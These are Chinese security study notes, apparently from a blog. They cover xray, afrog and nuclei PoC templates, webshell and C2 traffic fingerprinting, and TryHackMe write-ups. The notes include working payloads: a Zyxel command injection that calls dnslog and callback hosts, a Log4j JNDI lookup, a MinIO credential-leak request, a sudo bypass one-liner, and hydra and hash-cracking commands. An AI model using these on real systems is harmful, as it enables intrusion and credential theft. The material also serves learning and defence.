&#123;% endraw %&#125;    matchers:      - type: word        part: interactsh_protocol        name: dns        words:          - &quot;dns&quot;\n\n\n\n\n\nNuclei-Poc开发-BurpSuite一键生成插件nuclei-burp-plugin：\nhttps://github.com/projectdiscovery/nuclei-burp-plugin\n1、导入或商店安装\n\n2、配置插件路径信息\n\n3、数据包选择生成模版\nCVE-2023-28432\n\n4、复现一下漏洞\n\n\n\n\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"103-漏洞发现-Xray&Afrog&Poc开发&Yaml资源等","url":"/2025/09/16/103-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Xray&Afrog&Poc%E5%BC%80%E5%8F%91&Yaml%E8%B5%84%E6%BA%90%E7%AD%89/","content":"103-漏洞发现-Xray&amp;Afrog&amp;Poc开发&amp;Yaml资源等演示案例:\nXray&amp;Afrog-Poc 开发-环境配置&amp;编写流程\nXray-Poc 开发-数据回显&amp;RCE 不回显&amp;实验室\nAfrog-Poc 开发-数据回显&amp;RCE 不间显&amp;JDNI注入\nXray&amp;Afrog-Poc 开发-环境配置&amp;编写流程1、开发参考:https://poc.xray.cool/\nhttps://docs.xray.cool/#/guide/README\nhttps://mp.weixin.qq.com/s/XeF10F5xw19AymX34VALIW\nhttps://cloud.tencent.com/developer/article/1949351\n2、分析技巧:配置 config.yaml，使用代理看数据包分析(记得生成证书及安装)\n3、调试 Poc:\n\\xray --log-level debug webscan --poc .\\test.yaml --url https://xx.xx.xx.xx:XXXX\n\n\n\n第一部分:#名称部分\nname:string\npoc 名称如:poc-yaml-tongda-oa-rce\n\n第二部分:rules:[]Rule\t\t#脚本部分\npoc规则:poc请求路径，请求内容，回显信息都由此匹配\nmethod:string 请求方法\npath:string 请求的完整Path，包括querystring等\nheaders:map[string]string 请求HTTP头，Rule中指定的值会被覆盖到原始数据包的 HTTP 头中\nbody:string 请求的Body\nfollow redirects:bool 是否允许跟随300跳转expression:string\nsearch:string\nmethod、path、headers、body、follow redirects的作用是生成检测漏洞的数据\n同expression的作用是判断该条ule 的结果search 的作用是从返回包中提取信息\n\n\n第三部分:       \t\t\t\t\t #信息部分\ndetail:map[stringlstring\n就是平时 xray 扫描得到漏洞时 xray 返回的那一串爆红信息\n1、有回显匹配结果自动判断-CVE-2023-28432https://github.com/vulhub/vulhub/blob/master/minio/CVE-2023-28432/README.zh-cn.md\n# 名称部分name: poc-yaml-CVE-2023-28432 # 脚本部分transport: httprules:    r1:        request:            method: POST            path: &quot;/minio/bootstrap/v1/verify&quot;            headers:                Content-Type: application/x-www-form-urlencoded        expression: |            response.status==200 &amp;&amp; response.body_string.contains(&quot;MINIO_ROOT_PASSWORD&quot;)expression:    r1() # 信息部分detail:    author: xiaodisec    links:         - https://github.com/vulhub/vulhub/blob/master/minio/CVE-2023-28432/README.zh-cn.md\n\n\n2、无回显直接写死，观察平台回显判断是否存在漏洞-CVE-2022-30525https://blog.csdn.net/weixin_43080961/article/details/124776553\nname: poc-yaml-CVE-2022-30525manual: truetransport: httprules:  r0:    request:      method: POST      path: /ztp/cgi-bin/handler      body: &#x27;&#123;&quot;command&quot;:&quot;setWanPortSt&quot;,&quot;proto&quot;:&quot;dhcp&quot;,&quot;port&quot;:&quot;4&quot;,&quot;vlan_tagged&quot;:&quot;1&quot;,&quot;vlanid&quot;:&quot;5&quot;,&quot;mtu&quot;:&quot;;ping -c 3 nml0kn.dnslog.cn;&quot;,&quot;data&quot;:&quot;hi&quot;&#125;&#x27;      headers:        Content-Type: application/json    expression: response.status==200expression: r0()detail:  author: xiaodisec  links:    - https://blog.csdn.net/weixin_43080961/article/details/124776553\n\n\n\n3、反连写法及启动配置(解决无回显RCE及其他)\n\n\n参考地址：https://blog.csdn.net/m0_60571842/article/details/135591127\n\nname: poc-yaml-CVE-2022-30525manual: trueset:  reverse: newReverse()  reverseURL: reverse.url  reverseDomain: reverse.domaintransport: httprules:  r0:    request:      cache: true      method: POST      path: /ztp/cgi-bin/handler&#123;% raw %&#125;      body: &#x27;&#123;&quot;command&quot;:&quot;setWanPortSt&quot;,&quot;proto&quot;:&quot;dhcp&quot;,&quot;port&quot;:&quot;4&quot;,&quot;vlan_tagged&quot;:&quot;1&quot;,&quot;vlanid&quot;:&quot;5&quot;,&quot;mtu&quot;:&quot;;curl &#123;&#123;reverseURL&#125;&#125;;&quot;,&quot;data&quot;:&quot;hi&quot;&#125;&#x27;      headers:        Content-Type: application/json    expression: reverse.wait(5) //这里的写法决定了工具能不能探测出来expression: r0()detail:  author: xiaodisec  links:    - http://www.xiaodi8.com\n\n\n\nAfrog-Poc开发-数据回显&amp;RCE不回显&amp;JDNI注入1、开发参考：https://github.com/zan8in/afrog/wiki\n2、分析技巧：执行加入参数proxy，使用代理看数据包分析\n3、指定Poc：\nafrog.exe -t https://xx.xx.xx.xx -P xxxx.yaml\n\n第一部分：id info 编号 信息（类似nuclei）第二部分：set rules 变量 脚本（类似xray）第三部分：expression 判断 执行（类似xray）\nHTTP&#x2F;S数据回显Poc开发-CVE-2023-28432环境：MinIO集群模式信息泄露漏洞（CVE-2023-28432）\nhttps://vulhub.org/#/environments/minio/CVE-2023-28432/\n测试：\nafrog.exe -t https://xx.xx.xx.xx:xxxx -P minio.yaml\n\nid: CVE-2023-28432info:  name: My PoC demo1  author: xiaodisec  severity: criticalrules:  r0:    request:      method: POST      path: /minio/bootstrap/v1/verify      headers:        Content-Type: application/x-www-form-urlencoded    expression: response.status == 200 &amp;&amp; response.body.bcontains(b&#x27;MINIO_ROOT_PASSWORD&#x27;)expression: r0()\n\n\nHTTP&#x2F;S不回显RCE-Poc开发-CVE-2022-30525环境：某案例 Zyxel 防火墙远程命令注入漏洞配置：配置afrog-config.yaml ceye对应信息测试：\nafrog.exe -t https://xx.xx.xx.xx:xxxx -P zyxel.yaml\n\nid: CVE-2022-30525info:  name: My PoC demo2  author: xiaodisec  severity: criticalrules:  r0:    request:      method: POST      path: /ztp/cgi-bin/handler      body: &#x27;&#123;&quot;command&quot;:&quot;setWanPortSt&quot;,&quot;proto&quot;:&quot;dhcp&quot;,&quot;port&quot;:&quot;4&quot;,&quot;vlan_tagged&quot;:&quot;1&quot;,&quot;vlanid&quot;:&quot;5&quot;,&quot;mtu&quot;:&quot;;ping -c 3 cbvq0q.dnslog.cn;&quot;,&quot;data&quot;:&quot;hi&quot;&#125;&#x27;      headers:        Content-Type: application/json    expression: response.status == 200 &amp;&amp; response.body.bcontains(b&#x27;MINIO_ROOT_PASSWORD&#x27;)expression: r0()\n\n\n\nid: CVE-2022-30525info:  name: My PoC demo3  author: xiaodisec  severity: criticalset:  reverse: newReverse()  reverseURL: reverse.url  reverseDomain: reverse.domain  rules:  r0:    request:      method: POST      path: /ztp/cgi-bin/handler&#123;% raw %&#125;      body: &#x27;&#123;&quot;command&quot;:&quot;setWanPortSt&quot;,&quot;proto&quot;:&quot;dhcp&quot;,&quot;port&quot;:&quot;4&quot;,&quot;vlan_tagged&quot;:&quot;1&quot;,&quot;vlanid&quot;:&quot;5&quot;,&quot;mtu&quot;:&quot;;ping -c 3 &#123;&#123;reverseURL&#125;&#125;;&quot;,&quot;data&quot;:&quot;hi&quot;&#125;&#x27;      headers:        Content-Type: application/json    expression: reverse.wait(100)  //这里的写法决定了工具能不能探测出来expression: r0()\n\n\n\n这里就会调用自己配置文件里的相关反连平台\n   \n\n\nHTTP&#x2F;S不回显JNDI-Poc开发环境：Apache Log4j2 lookup feature JNDI injection (CVE-2021-44228)https://vulhub.org/#/environments/log4j/CVE-2021-44228/\n配置：启动jndi-payload利用：\njava -jar JNDIMonitor-2.0.1-SNAPSHOT.jar -i 0.0.0.0 -l 1389 -p 3456\n\n\n\n\n测试：\nafrog -t http://192.168.139.128:8983 -P log4j.yaml\n\n\nid: solr-log4j-rceinfo:  name: Apache Solr Log4j Remote Code Execution  author: xiaodisec  severity: critical  verified: true  created: 2023/10/16set:  reverse: newJNDI()  jndiURL: reverse.url.host + reverse.url.pathrules:  r0:    request:      method: GET&#123;% raw %&#125;      path: /solr/admin/collections?action=$&#123;jndi:ldap://&#123;&#123;jndiURL&#125;&#125;&#125;&amp;wt=json    expression: reverse.jndi(5)expression: r0()\n\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"104-漏洞发现-推荐插件&武装burp&浏览器&辅助分析等","url":"/2025/09/16/104-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%8E%A8%E8%8D%90%E6%8F%92%E4%BB%B6&%E6%AD%A6%E8%A3%85burp&%E6%B5%8F%E8%A7%88%E5%99%A8&%E8%BE%85%E5%8A%A9%E5%88%86%E6%9E%90%E7%AD%89/","content":"104-漏洞发现-推荐插件&amp;武装burp&amp;浏览器&amp;辅助分析等知识点：\n1、插件类-武装BurpSuite-漏洞检测&amp;分析辅助\n2、插件类-武装谷歌浏览器-信息收集&amp;情报辅助\n插件类-武装BurpSuite-漏洞检测&amp;分析辅助","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"213-蓝队技能-应急响应篇&Web入侵指南&查杀分析&项目环境等","url":"/2025/09/16/213-%E8%93%9D%E9%98%9F%E6%8A%80%E8%83%BD-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AF%87&Web%E5%85%A5%E4%BE%B5%E6%8C%87%E5%8D%97&%E6%9F%A5%E6%9D%80%E5%88%86%E6%9E%90&%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E7%AD%89/","content":"213-蓝队技能-应急响应篇&amp;Web入侵指南&amp;查杀分析&amp;项目环境等知识点\n1、应急响应-Web入侵指南-分析入口思路2、应急响应-Web入侵指南-Webshell查杀3、应急响应-Web入侵指南-流量包捕获解密分析\n演示案例-蓝队技能-Web入侵-入口&amp;查杀&amp;攻击链等1、Web攻击事件获取当前WEB环境的组成架构（脚本，数据库，中间件，系统等）分析入侵思路：1、利用时间节点筛选日志行为2、利用对漏洞进行筛选日志行为3、利用后门查杀进行筛选日志行为4、利用文件修改时间筛选日志行为5、利用流量捕获设备数据包分析行为\n2、Web日志分析WEB日志如果不知道放哪里都可以百度查\nIIS+.net（基于时间节点筛选日志）\n\n\n\n\n\n\n通过日志分析这里有很多sqlmap的数据包，攻击者对网站实行了注入\t，访问url地址发现是一个登录页面，模拟一下是不是这里产生的sql注入 \n\n\nApache+php（基于漏洞筛选日志）\n\n\n\n\nTomcat+jsp（基于后门查杀筛选日志）\n\n\n\n通过后内查杀找到了后内文件日志里面区定位什么时间第一次访问了后门之前的IP访问就可能是攻击利用的过程\nmanager&#x2F;html\n\n\n3、Web后门查杀注：关于内存马查杀还需后续讲解1、阿里伏魔(在线)https://ti.aliyun.com/#/webshell2、河马(软件)https://n.shellpub.com/3、CloudWalker(牧云)https://stack.chaitin.com/security-challenge/webshell4、在线webshell查杀-灭绝师太版http://tools.bugscaner.com/killwebshell/5、WebShell Detector WebShell扫描检测器http://www.shelldetector.com/6、D盾(软件)http://www.d99net.net7、各类杀毒火绒，管家，X60，Defender，Nod32等\n\n4、Web攻击链分析1、数据包流量特征2、工具流量特征指纹了解使用哪种工具或哪种技术、漏洞利用等因为日志大部分不会存储POST数据包或存储过少，导致无法分析具体行为主机会采用流量捕获设备或防御检测系统抓到攻击流量包，便于分析具体行为\n\n1、哥斯拉流量包Tomcat+jsp 攻击者已经通过后台上传war包方式上传了一个哥斯拉shell，蓝队人员如何通过流量分析出shell是哥斯拉的的流量\n\n\n\n\n\n2、漏洞利用流量包shiro反序列化漏洞\n\n\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"214-蓝队技能-应急响应篇&C2后门&权维技术&基线检测&项目环境等","url":"/2025/09/16/214-%E8%93%9D%E9%98%9F%E6%8A%80%E8%83%BD-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AF%87&C2%E5%90%8E%E9%97%A8&%E6%9D%83%E7%BB%B4%E6%8A%80%E6%9C%AF&%E5%9F%BA%E7%BA%BF%E6%A3%80%E6%B5%8B&%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E7%AD%89/","content":"214-蓝队技能-应急响应篇&amp;C2后门&amp;权维技术&amp;基线检测&amp;项目环境等","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"228-蓝队技能-流量分析篇&Web后门&工具特征&分析项目等","url":"/2025/09/16/228-%E8%93%9D%E9%98%9F%E6%8A%80%E8%83%BD-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%AF%87&Web%E5%90%8E%E9%97%A8&%E5%B7%A5%E5%85%B7%E7%89%B9%E5%BE%81&%E5%88%86%E6%9E%90%E9%A1%B9%E7%9B%AE%E7%AD%89/","content":"228-蓝队技能-流量分析篇&amp;Web后门&amp;工具特征&amp;分析项目等蓝队技能-流量分析-WebShell 工具分析流量的原因？\n1、明白项目平台系统警告信息原理\n2、自行学习到流量分析的技术和思路\n3、通过特征尝试性开发规则进行检测\n特征出现面1、请求头!\n2、请求包\n3、回显数据\n请求包:尝试利用默认密钥等解密 成功还原算法明文即可认定对应工具\n回显数据:尝试利用默认密钥等解密 成功还原算法明文即可认定对应工具\nWebshell 工具类：菜刀，蚁剑，冰蝎，天蝎，哥斯拉\n工具：burpsuite\n环境：本地靶场\n菜刀：https://mp.weixin.qq.com/s/SjUMoY6EafQzAb3RNWNkpg\n\n特征多 没有做二次开发 没有开源 已被淘汰\n\n\n特征一：POST方法，一句话路径\n特征二：UA头均为baidu爬虫标识\n特征三：特征为链接密码，base64前缀相同\n特征四：返回结果在响应包中使用X@Y作为定界符包裹，命令存在[S] [E]作为定界符\n\n蚁剑：（defult,rot13）\n特征一：Post提交\n\n特征二：User-Agent：antSoword&#x2F;v2.1 在不修改请求头的情况下默认是这个样子的\n\n特征三：@ini set(“display errors”,”0”);@set time limit(0);\n\n特征四：Base64 编码提交的数据（去掉前两位）\n\n\n\n使用yakit进行抓包 在蚁剑代理设置为yakit代理ip\n\n\n\n\n\n\n\n冰蝎\nPOST传参\nUser-Agent: Mozilla&#x2F;5.0(windows NT 6.1;Trident&#x2F;7.0; rv:11.0)like Gecko\nAccept :text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp, image&#x2F;apng,&#x2F;;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9\nAccept-Language:h-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7\n部分 3.0 以后的子版本至 4.0 以后增加了 referer 参数，末尾文件名随机大小写\n尝试利用默认密钥等解密 成功还原算法明文即可认定对应工具\n\n\n\n\n天蝎\n\nPOST传参\nX-Forwarded-For:（有的可能没有）\nUser-Agent:Mozilla&#x2F;5.0(Windows NT10.0;Win64;x64)AppleWebKit&#x2F;537.36(KHTM，like Gecko)Chrome&#x2F;89.0.4389.90Safari&#x2F;537.36 Edg&#x2F;89.0.774.57\nContent-Type:application&#x2F;octet-stream\n尝试利用默认密钥等解密 成功还原算法明文即可认定对应工具\n\n\n\n\n哥斯拉（PHP EVAL XOR BASE64）\n流量中可见eval、base64_decode、strrev等函数\n\n强特征:链接失败情况下2个流量包，成功为 3个流量包\n\n第一个请求总会发送大量数据，这是配置信息，且请求包内无 cookie，服务器响应包无内容，生成一个 session，后续请求会带上此session 到请求包中的 cookie中3、强特征:生成的 cookie 后面有个分号\n\nAccept:text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8\n\nAccept-Language :zh-CN,zh;q&#x3D;0.8,zh-Tw;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-Us;q&#x3D;0.3,en;q&#x3D;0.2\n\n尝试利用默认密钥等解密 成功还原算法明文即可认定对应工具\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n工具解密定性:(天蝎，冰蝎，哥斯拉)知道密钥(工具内置的默认密钥，魔改二改发生的算法变化或密钥修改，则失效)https://github.com/abc123info/BlueTeamTools\n\nwireshark使用\nIP 地址ip.addr&#x3D;&#x3D;IP 针对某个 IP 过滤ip.src&#x3D;&#x3D;IP 源IP 过滤ip.dst&#x3D;&#x3D;IP 目的 IP 过滤过滤目的 ip\n\n端口:tcp.port&#x3D;-端口号 显示主机端口的数据包tcp.srcport&#x3D;-端口号 显示源主机端口的数据包tcp.dstport&#x3D;端口号 显示目的主机端口的数据包\n\n协议:tcp、udp、http、arp、icmp、smtp、pop、telnet、ssh、rdp等等小写直接输入，回车\n\nGET,POST 过滤，大写http.request.method&#x3D;&#x3D;”GET”http.request.method&#x3D;&#x3D;”POST”\n\n逻辑运算符:and、or、|1、&amp;等等ip.src&#x3D;&#x3D;IP and http 过滤源地址并且是 http 协议的\n\n特定字符过滤http contains “Content-Type:http.request.uri&#x3D;&#x3D;”&#x2F;pikachu&#x2F;vul&#x2F;unsafeupload&#x2F;uploads&#x2F;1.php”\n\n\n面试题型冰蝎数据包\n根据题目提示 webshell 使用工具是冰蝎 冰蝎流量特征 使用http协议  post提交 打开wireshark进行筛选\n\nhttp.request.method==&quot;POST&quot;对流量进行过滤\n\n\n选择那个长度为100的流量包 ，右键选择-追踪流-http流 然后看到数据包的详情信息\n\n拉到下面 在post前面 请求包复制  这里使用蓝队工具箱解密不出来 要使用AES-AES64 进行解密http://tools.bugscaner.com/cryptoaes/ 复制蓝队工具箱里面冰蝎解密的默认密钥e45e329feb5d925b 填入解密工具里面 成功解密 \n\n提示这段流量包使用了base64加密 在yakit里面再进行解密 将解密出来的结果再进行base解密即可拿到原文\n\n将解密出来的原文粘贴放在一个新文件里面 修改为html结尾的格式 用浏览器打开 得到phpinfo界面\n\n在这个界面查找IP关键字即可查到ip地址和用户名\n\n\n冰蝎在初始化链接的时候 会载入phpinfo界面 在这个界面里面会再入详细信息 这个详细信息基本等同phpinfo界面\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n蚁剑数据包\n根据题目提示 webshell 使用工具是蚁剑 跟上面一样 根据他们的流量特征 使用http协议  post提交 打开wireshark进行筛选\n\nhttp.request.method==&quot;POST&quot;对流量进行过滤 在第一个流量包里面发现了服务器 JAVA版本号\n\n\n我们在对TCP.stream eq 39进行搜索 http追踪 提取我复制的参数 拿到burp里面进行解码\n\n先进行url解码 然后在进行base64解码 最后去掉开头两位Av即可解码\n从解码后的代码看到这里是进行的操作命令是 env 从中可以拿到java版本\n\n\n我们现在对他的回显包里面进行解码 先进行url解码 然后在进行base64解码 拿到原文 从中看到版本\n\n我们在对TCP.stream eq 43进行搜索 追踪 提取我复制的参数 拿到burp里面进行解码\n\n先进行url解码 然后在进行base64解码 最后去掉开头两位BZ即可解码\n\n\n找到对此对应的响应包拿到 .&#x2F;sercret 文件内容为 拼接起来即可拿到flag\n\ncd &quot;/usr/local/tomcat&quot;;cat /.secret;echo f5cd9;pwd;echo @a25fbclc5\n\n\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"229-蓝队技能-流量分析篇&C2远控&工具特征&分析项目等","url":"/2025/09/16/229-%E8%93%9D%E9%98%9F%E6%8A%80%E8%83%BD-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%AF%87&C2%E8%BF%9C%E6%8E%A7&%E5%B7%A5%E5%85%B7%E7%89%B9%E5%BE%81&%E5%88%86%E6%9E%90%E9%A1%B9%E7%9B%AE%E7%AD%89/","content":"229-蓝队技能-流量分析篇&amp;C2远控&amp;工具特征&amp;分析项目等蓝队技能-流量分析-C2 远控工具C2MsF、CS、Sliver、Viper、Havoc、Vshell、Supershell等\nCS\nHTHPhttps://blog.didierstevens.com/didier-stevens-suite\nhttps://github.com/DidierStevens/DidierStevensSuite\npython 1768.py xxxx.vir\nHTTP&#x2F;CS特征\n固定数据包头\n\n//请求头\nGET /Jsh8 HTTP/1.1\nUser-Agent: Mozilla/5.0(compatible; MSIE 9.8; Windows NT 6.1; Trident/5.0; BOIE9;ENUS)\nHost: 192.168.1.9:1111\nConnection: Keep-Alive\nCache-Control:no-cache\n* ```  //返回包  HTTP/1.1 200 0K  Date:Tue,17 Sep 2024 12:19:32 GMT  Content-Type:application/octet-streamContent-Length:277063\n\n\n\n\n路径特征:固定的checksum8算法(92L 93L)\n\npublic class EchoTest&#123;\n    public static long checksum8(string text)&#123;\n        if(text.length()&lt;4)&#123;\n            return 0L;\n            &#125;\n\ntext = text.replace(&quot;/&quot;,&quot;&quot;);\nlong sum=0L;\nfor(int x=0;x&lt;text.length();x++)&#123;\n\n    sum +=text.charAt(x);\n    &#125;\nreturn sum % 256L;\n&#125;\npublic static void main(string[] args) throws Exception\n&#123;\n    System.out.println(checksum8(&quot;Yle2&quot;)\n&#125;\n//64位为93\n//32位为92\n3. 心跳包解析   1. 选中要解析的流量包 保存到桌面   2. 使用上面那款工具https://github.com/DidierStevens/DidierStevensSuite 对流量包进行解析   3. 展示心跳包里面的一些数据 和信息      * ![image-20250621203256619](/img/image-20250621203256619.png)      * ![image-20250621203424016](/img/image-20250621203424016.png)      * ![image-20250621203533378](/img/image-20250621203533378.png)4. 请求特征:间隔时间 URL路径 下发指令 UA头(老版本)   /cx   PoST /submit.php?id=### HTTPS/CS1. 证书特征(.store)2. 源码特征(ja3 ja3s)* ```  client hello   4d5efa96609dc906f796e63cff009c2a\tdb36bad574044a5104a59b0c676991efserver     server hello   15af977ce25de452b96affa2addb1036\t2253c82f03b621c5144709b393fde2xc9\n\n\n\n\n\n\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"Agent Sudo  Writeup  TryHackMe","url":"/2025/09/16/Agent%20Sudo%20%20Writeup%20%20TryHackMe/","content":"Agent Sudo | Writeup | TryHackMe、一、信息收集使用nmap对ip地址的端口进行探测\nnmap -sS -sV -A  &lt;ip&gt;\n\n\n\n可以看到上面80端口开放这一个web服务器我们看看\n\n\n\n这里提示了R作为user-agent来进行访问，使用curl命令看看\n\ncurl -A &quot;R&quot; -L 10.10.12.116\n\n\n\n这里又给了我们一段提示告诉我们这里不是R但是是26个英文字母之一，然后我去从A开始尝试，到C这里找到了我想要的\n\n\n二、哈希破解和暴力破解\n这里给了我们一个用户名chris但是不知道这个用户是FTP的还是SSH的我们使用hydra来爆破看看\n\nhydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.12.116 ftp \n\n\n\n成功爆破出了密码，我们登录看看\n\n\n\n下面有一个写给J的文件和两张图片我们全部下载下来\n\n\n\n查看写给J的文件其中解释说密码在假图像中\n\n\n\n我们使用binwalk来查看文件\n\n\nbinwalk 是一个 二进制文件分析工具，主要用于 嵌入式固件、固件镜像和二进制文件的逆向工程。它能够自动识别文件中的特征结构、压缩包、可执行文件、加密数据等，非常适合安全研究和 CTF 场景\n\n\n\n在这里PNG 文件里隐藏了一个加密的 Zip 文件，这是典型的 **隐写术（steganography）**我们把隐藏在图片里的zip文件提取出来\n\nbinwalk -e cutie.png\n\n如果提示没有jar你可以通过安装 default-jdk 或者 openjdk-11-jdk 获得 jar\n# 安装默认 JDKsudo apt updatesudo apt install default-jdk# 或者指定版本sudo apt install openjdk-11-jdk\n\n\n\n\n这里还是不能直接对这个加密的zip进行爆破，得使用zip2john\n\n\nzip2john 是 John the Ripper（JtR）套件里自带的一个工具，用来将 加密的 ZIP 文件 转换成 John the Ripper 可以识别的 hash 格式，以便进行密码破解。\n\n当你有一个 加密的 ZIP 文件 时，直接用 John the Ripper 是不行的\nzip2john 会把 ZIP 文件里的加密信息提取出来，生成一个类似 hash 的文本文件\n然后你可以用 john 来暴力破解或者字典破解这个密码\n\n\n转换完后直接使用john来破解得到密码alien，接下来使用这个密码解压8702.zip\n\n\n\n查看文件内容\n\n\n\n这里给了我们一个密码QXJLYTUx，好像是进过base64编码过的解码 拿到密码\n\n\n\n使用steghide查看\n\n\n三、捕获用户标志\n查看message.txt文件，告诉了我们账户和密码\n\n\n账户：james密码：hackerrules!\n\n\n使用ssh登录\n\nSSH \n\n\n\n拿到flag\n\n\n\n使用nc将图片反弹到我们kali上面\n\nKALI:nc -lvnp 4444 &gt; Alien.jpg james@agent-sudo:~$ nc 10.17.35.134 4444 &lt; Alien_autospy.jpg\n\n\n查看图片，算了不看了直接告诉你们这是美国的Roswell alien autopsy事件，因为我当时做这个题目的时候已经很疲惫了，所以给吓到了\n\n四、提权\n属于sudo -l看看当前用户有什么是以root身份启动的命令\n\n\n(ALL, !root)：意思是 james 可以以任何用户身份执行 /bin/bash，但是不能直接成为 root/bin/bash 是 可以用 sudo 执行的命令\n关键点：可以切换到其他用户，包括系统里权限更高的用户（如果存在），或者一些有特殊权限的服务账户\n\n我们查看sudo版本\n\n\n根据 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287\n\n在 Sudo 1.8.28 之前，一个拥有访问 Runas ALL sudoer 账户的攻击者可以通过调用 sudo 并使用精心制作的用户 ID 来绕过某些策略黑名单和会话 PAM 模块，并导致错误记录。例如，这允许绕过!root 配置和 USER&#x3D;记录，对于 sudo -u \\#$((0xffffffff)) 命令。\n\nsudo -u \\#$((0xffffffff)) /bin/bash\n\n\n","categories":["TryHackMe"],"tags":["渗透测试","Web安全","网络安全","学习笔记"]},{"title":"Brute It -TryHackMe","url":"/2025/09/16/Brute%20It%20-TryHackMe/","content":"Brute It -TryHackMe一、信息收集\n使用nmap对网站ip开放端口进行搜集\n\n\n\n使用dirsearch发现网站下面有个admin目录访问看看\n\n\n\n是一个管理员登录界面\n\n\n\n在这个页面右键源代码发现了给我们的提示，告诉我们这个网站的账户是admin，我们抓包使用yakit进行爆破\n\n\n二、枚举爆破\n接下来使用hydra对网站的密码进行爆破\n\nhydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.255.234 http-post-form &quot;/admin/:user=^USER^&amp;pass=^PASS^&amp;Login=Login:Username or password invalid&quot;\n\n\n\n拿到了账户密码去登录看看\n\n\n\n这里告诉我们john的私钥，已经很明显了先讲私钥保存到本地在使用ssh2john将私钥转化成哈希值在使用john进行爆破\n\n\n\n这里成功爆破出密码 rockinroll 使用ssh对john进行登录\n\n\n\n我这里遇到了报错这里直接修改私钥权限就好了chmod 600 id_rsa\n\nPermissions 0664 for &#x27;id_rsa&#x27; are too open.This private key will be ignored.Load key &quot;id_rsa&quot;: bad permissions当前私钥 id_rsa 权限为 0664（所有者可读写，组可读，其他用户可读）SSH 要求私钥 只能自己读写，不能被组或其他用户访问因此 SSH 忽略了私钥，并回退到密码登录提示\n\n\n\n在当前目录发现了user.txt\n\n\n三、提权\n使用sudo -l 看看有什么命令是以root方式启动的\n\n\n\n这里可以&#x2F;bin&#x2F;cat 命令可以root 权限启动 在这里我们尝试读取&#x2F;etc&#x2F;passwd下面的hash值然后保存在使用john进行爆破\n\n\n\n\n$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0\n\n\n将root和john的hash保存为文件使用john爆破\n\njohn --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt password.txt  \n\n\n\n这里使用john爆破只爆破出来一个密码，尝试登录了一下发现是root的密码\n\n\n\n直接查看根目录的root.txt文件\n\n\n","categories":["TryHackMe"],"tags":["渗透测试","Web安全","网络安全","学习笔记"]},{"title":"Crypto & Hashes - TryHackMe","url":"/2025/09/16/Crypto%20&%20Hashes%20-%20TryHackMe/","content":"Crypto &amp; Hashes - TryHackMeCrack the hashLevel 1第一题房间地址：https://tryhackme.com/room/crackthehash\n这里给我们一串编码，看起来像是md5\n\n长度：32 个十六进制字符（即 128 位）。例如 48bb6e862e54f2a795ffc4e541caed4d。\n\n表示形式：通常小写或大写 hex（0–9 a–f &#x2F; A–F）。\n\n\n我们使用网站进行破解MD5这个网站是一个专门对md5破解的网站\n\n\n第二题\n这个编码有点不认识使用hasdid识别一下\n\nhashid（Python，命令行，轻量） 安装：sudo apt update &amp;&amp; sudo apt install -y hashid 或 pip3 install hashid\n\nhashid CBFDAC6008F9CAB4083784CBD1874F76618D2A97\n\n\n这里显示SHA-1的可能性比较高，我们拿到网站上破解一下，依旧是上面那个网站\n\nSHA-1特征\n\n字符集：0–9, a–f 或大写 A–F\n输出长度：固定 160 位（20 字节），通常用 40 个十六进制字符表示。\n\n第三题看不懂什么编码拿去hashid分析一下看看是什么类型\n\n这里提示我们是Snefru-256或者SHA-256不知道是什么ai一下\n\nSnefru-256 是一种老牌的密码学哈希函数（Snefru 家族的 256-bit 输出变体），由 Ralph C. Merkle 在 1990 年设计。它可以输出 128 位或 256 位哈希，但它属于“年代久远且有已知弱点”的算法，不建议在新系统里用作安全哈希\n\n感觉像是SHA-256丢进去看看\n\nSHA-256特征\n\n输出长度：固定 256 位（32 字节），通常表示为 64 个十六进制字符。\n字符集：0–9, a–f 或 A–F\n\n第四题\n开头 $2y$：表示这是 bcrypt 哈希算法（PHP 默认生成 bcrypt 时会带 $2y$ 前缀，$2a$ 也常见，这个编码没有在线工具破解只有使用hashcat来破解\nhashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --status --status-timer=10 -o cracked.txt\n\n最后爆破出来结果为bleh\n第五题\n直接丢到hasdid识别这里我最后尝试了一下发现是MD4\n\n丢进hashcat进行爆破答案 